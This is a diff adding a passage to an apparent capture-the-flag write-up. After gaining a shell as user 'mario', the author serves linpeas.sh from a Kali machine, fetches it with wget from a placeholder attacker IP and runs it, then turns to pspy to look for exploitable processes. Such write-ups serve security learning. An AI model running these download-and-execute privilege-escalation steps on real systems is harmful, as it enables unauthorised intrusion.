@@ -73,4 +73,23 @@ I was then used this password to su mario:
 
 ![su mario](https://github.com/user-attachments/assets/ede5ede8-50dd-48e7-98ca-234218844851)
 
+Now, let's head to /tmp, and run linpeas. I ran a python server from kali:
+```bash
+python3 -m http.server
+```
+And wget from mario:
+```bash
+wget http://<your IP>:8000/linpeas.sh
+```bash
+chmod +x linpeas.sh
+```
+```bash
+./linpeas.sh >> output
+```
+
+I didn't many concrete things that we could use. Let's use pspy to see if we can find processes to exploit:
+
+![pspy64](https://github.com/user-attachments/assets/db94d3b3-e0b9-4ccb-ad6d-3d1a76525d1d)
+
+
 
